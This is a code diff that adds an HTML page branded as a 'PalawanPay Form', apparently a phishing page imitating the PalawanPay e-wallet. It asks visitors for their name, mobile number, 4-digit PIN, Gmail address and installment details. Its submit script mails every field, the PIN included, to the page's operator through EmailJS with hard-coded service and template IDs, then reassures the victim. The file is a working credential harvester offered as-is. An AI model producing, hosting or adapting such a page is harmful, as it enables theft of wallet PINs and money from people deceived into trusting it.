@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PalawanPay Form</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("KoDtU57AV30FBPls2");
+    })();
+  </script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://example.com/palawanpay-background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 400px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #046930;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #046930;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #035224;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>PalawanPay Form</h2>
+    <form id="contact-form">
+      <input type="text" name="name" placeholder="Name" required />
+      <input type="tel" name="mobile" placeholder="Mobile Number" required />
+      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />
+      <input type="email" name="email" placeholder="Gmail" required />
+      <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('contact-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      emailjs.sendForm('service_0v6id51', 'template_f7kxyzp', this)
+        .then(function() {
+          alert('Your information has been sent to Gmail. Thank you!');
+          document.getElementById('contact-form').reset();
+        }, function(error) {
+          console.log('FAILED...', error);
+          alert('There was a problem submitting your form.');
+        });
+    });
+  </script>
+</body>
+</html>
